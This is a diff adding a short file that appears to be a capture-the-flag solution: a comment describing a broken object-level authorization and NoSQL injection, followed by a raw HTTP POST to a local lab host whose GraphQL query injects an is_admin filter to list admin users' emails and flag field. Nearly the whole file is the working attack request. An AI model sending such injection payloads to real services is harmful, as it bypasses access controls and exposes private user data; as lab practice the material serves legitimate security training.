@@ -1,0 +1,8 @@
+# BOLA + NoSQL injection: bypass client-side is_admin=false filter by sending {"is_admin": true} directly. Reveals admin2@goodyoutriedsomethingelse.com with flag field containing CTF flag.
+
+POST /api/users HTTP/1.1
+Host: 172.17.0.1:42595
+Content-Type: application/json
+Content-Length: 142
+
+{"query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 100}\") { username email flag } }"}
